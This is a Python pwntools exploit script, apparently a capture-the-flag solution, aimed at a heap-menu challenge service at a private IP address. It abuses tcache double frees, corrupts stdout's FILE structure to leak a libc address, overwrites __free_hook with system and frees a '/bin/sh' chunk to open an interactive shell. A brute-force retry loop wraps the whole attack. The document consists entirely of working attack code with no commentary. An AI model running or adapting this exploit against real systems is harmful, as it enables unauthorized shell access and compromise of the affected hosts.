from pwn import *
context.arch = 'amd64'
libc = ELF("./libc.so.6")

def add(index,size,data):
	io.sendlineafter("choice > ","1")
	io.sendlineafter("index\n",str(index))
	io.sendlineafter("size\n",str(size))
	io.sendafter("something\n",data)
	io.recvuntil("gift :0x")
	return int(io.recv(12),16)
def addx(index,size,data):
	io.sendlineafter("choice > ","1")
	io.sendlineafter("index\n",str(index))
	io.sendlineafter("size\n",str(size))
	io.sendafter("something\n",data)
def rmv(index):
	io.sendlineafter("choice > ","2")
	io.sendlineafter("index\n",str(index))
while True:
	try:
		#io = process("./pwn")
		io = remote('172.16.9.21',9006)
		listbase = add(0,0x70,'0000')
		print hex(add(1,0x70,'1111'))
		add(2,0x60,'XXXX')
		add(3,0x70,'XXXX')
		add(4,0x70,'XXXX')
		rmv(2)
		rmv(2)
		rmv(0)
		rmv(0)

		add(5,0x70,p64(0x561e78b74f60-0x561e78b74e70+listbase))
		add(6,0x70,p64(0x561e78b74f60-0x561e78b74e70+listbase))
		add(7,0x70,p64(0)+p64(0xf1))

		add(8,0x40,'aaaa')
		add(20,0x40,'aaaa')
		add(21,0x40,'aaaa')
		add(22,0x40,'aaaa')
		add(23,0x40,'/bin/sh;\x00')
		rmv(8)
		rmv(8)
		rmv(8)
		rmv(8)
		rmv(8)
		rmv(8)
		add(9,0x40,p64(0x561e78b74f70-0x561e78b74e70+listbase))
		add(10,0x40,p64(0x561e78b74f70-0x561e78b74e70+listbase))

		for i in range(8):
			rmv(2)

		payload = p64(0)*2+p64(0xfbad1800)+p64(0)*3+'\x08'

		add(11,0x40,'\x50\x77')
		add(12,0x60,payload)
		#gdb.attach(io,'b *0x0000555555554e26\nb *write')
		addx(13,0x60,payload)
		libcbase = u64(io.recv(8))-(0x0000155554f488b0-0x0000155554b5b000)
		info("LIBC BASE -> %#x"%libcbase)

		add(14,0x40,' ')
		rmv(21)
		rmv(21)
		add(16,0x40,p64(libc.sym['__free_hook']+libcbase))
		add(17,0x40,p64(libc.sym['__free_hook']+libcbase))
		add(18,0x40,p64(libc.sym['system']+libcbase))
		rmv(23)
		io.interactive()
	except Exception,e:
		info(str(e))
		io.close()